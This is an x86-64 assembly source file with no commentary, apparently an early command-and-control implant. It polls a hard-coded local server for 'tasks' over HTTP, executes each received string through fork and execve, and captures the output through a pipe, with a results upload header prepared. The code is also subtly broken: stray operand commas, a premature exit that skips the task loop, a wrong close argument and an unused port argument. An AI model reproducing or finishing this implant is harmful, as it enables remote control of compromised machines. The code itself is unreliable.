SECTION .bss
  bind_port   resq            1
  sigaction   resq            4
  sockaddr    resq            2
  timeout     resb            1
  pid         resd            1
  fds         resd            2
  output      resb            0x400

SECTION .data
  usage_msg:
    db "usage: ./run <BIND_PORT>", 0ah, 0h
  usage_len equ $ - usage_msg
  connect_err_msg:
    db "connection failed, press <Enter> to retry..", 0ah, 0h
  connect_err_len equ $ - connect_err_msg
  newline_msg:
    db "", 0ah, 0h
  newline_len equ $ - newline_msg
  double_newline_msg:
    db "", 0ah, 0ah, 0h
  double_newline_len equ $ - double_newline_msg
  get_task_msg:
    db "GET /tasks HTTP/1.1", 0ah, 0ah, 0h
  get_task_len equ $ - get_task_msg
  task_recv_msg:
    db "[*] Executing new task: ", 0h
  task_recv_len equ $ - task_recv_msg
  response_header_msg:
    db "POST /results HTTP/1.1", 0ah
    db "Content-Type: text/plain", 0ah
    db "Content-Length: 1024", 0ah, 0ah, 0h
  response_header_len equ $ - response_header_msg

SECTION .text
  global      _start

_start:
  cmp         BYTE [rsp],     1
  jle         _usage
  lea         rdi,            [rsp+8]
  
_socket:

  ; sigaction struct
  push        QWORD           0
  push        QWORD           0
  push        QWORD           0
  push        QWORD           1
  mov         [sigaction],    rsp
  add         rsp,            0x20

  ; ignore SIGPIPE
  mov         rax,            13
  mov         rdi,            13
  mov         rsi,            [sigaction]
  xor         rdx,            rdx
  mov         r10,            8
  syscall

  mov         rax,            41
  mov         rdi,            2
  mov         rsi,            1
  xor         rdx,            rdx
  syscall

  ; construct sockaddr
  push        DWORD           0
  push        DWORD           0x0100007F
  push        WORD            0x901F
  push        WORD            2
  mov         [sockaddr],      rsp
  add         rsp,            0x14

_tryConnect:

  push        rax
  mov         rdi,            rax
  mov         rsi,            [sockaddr]
  mov         rdx,            DWORD 16
  mov         rax,            42                ; connect()
  syscall
  test        rax,            rax
  jnz          _connectErr

_reqLoop:

  mov         rax,            1                 ; write()
  mov         rsi,            get_task_msg
  mov         rdx,            get_task_len
  syscall

  sub         rsp,            0x400
  mov         rax,            0                 ; read()
  mov         rsi,            rsp,
  mov         rdx,            0x400
  syscall

  mov         r14,            rdi

  mov         rax,            1
  mov         rdi,            1
  mov         rsi,            task_recv_msg
  mov         rdx,            task_recv_len
  syscall
  mov         rax,            1
  mov         rsi,            rsp,
  mov         rdx,            0x400
  syscall
  mov         rax,            1
  mov         rsi,            newline_msg
  mov         rdx,            newline_len
  syscall

  ; pipe()
  mov         rax,            22
  mov         rdi,            QWORD fds
  syscall

  ; fork()
  mov         rax,            57
  syscall
  mov         [pid],          rax

  cmp         rax,            0
  je          _childProc

_parentProc:

mov rax, 1
mov rdi, 1
mov rsi, get_task_msg
mov rdx, get_task_len
syscall

  ; close write end
  mov         rax,            3
  mov         rdi,            [fds + 4]
  syscall

  ; read()
  mov         rax,            0
  mov         rdi,            [fds]
  mov         rsi,            output
  mov         rdx,            0x400
  syscall

  ; close read end
  mov         rax,            3
  mov         rdi,            [fds]
  syscall

  jmp         _exit

  add         rsp,            0x400
  jmp         _tryConnect

_childProc:
  
  ; dup2()
  mov         rax,            33
  mov         rdi,            [fds+4]
  mov         rsi,            1
  syscall

  ; close read end
  mov         rax,            3
  mov         rdi,            fds
  syscall

  ; close write end
  ;mov         rax,            3
  ;mov         rdi,            [fds+4]
  ;syscall

  ; execve()
  mov         rax,            59
  mov         rdi,            rsp
  mov         rsi,            0
  mov         rdx,            0
  syscall

; wait4()
  mov         rax,            61
  xor         rdi,            rdi
  xor         rsi,            rsi
  xor         rdx,            rdx
  xor         r10,            r10
  syscall

  mov         rax,            60
  xor         rdi,            rdi
  syscall
 
_usage:
  mov         rax,            1
  mov         rdi,            1
  mov         rsi,            usage_msg
  mov         rdx,            usage_len
  syscall
  jmp         _exit

_connectErr:
  mov         rax,            1
  mov         rdi,            1
  mov         rsi,            connect_err_msg
  mov         rdx,            connect_err_len
  syscall

  mov         rax,            0
  mov         rdi,            0
  mov         rsi,            1
  syscall

  pop         rax
  jmp         _tryConnect

_exit:
  mov         rax,            60
  xor         rdi,            rdi
  syscall
